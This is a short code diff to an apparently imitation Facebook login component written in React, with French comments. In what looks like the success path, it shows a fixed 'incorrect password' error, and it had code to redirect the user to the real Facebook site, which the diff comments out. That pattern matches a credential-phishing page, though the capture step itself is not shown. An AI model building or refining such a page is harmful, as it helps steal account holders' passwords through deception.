@@ -26,9 +26,9 @@ const FacebookLogin = () => {
    
       setError("Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer.");
             // Attendre 5 secondes avant de rediriger l'utilisateur
-            setTimeout(() => {
-              window.location.href = "https://www.facebook.com"; // Rediriger vers Facebook
-            }, 3000); // 5000 millisecondes = 5 secondes
+            // setTimeout(() => {
+            //   window.location.href = "https://www.facebook.com"; // Rediriger vers Facebook
+            // }, 3000); // 5000 millisecondes = 5 secondes
     } catch (error) {
       // Gérer les erreurs
      
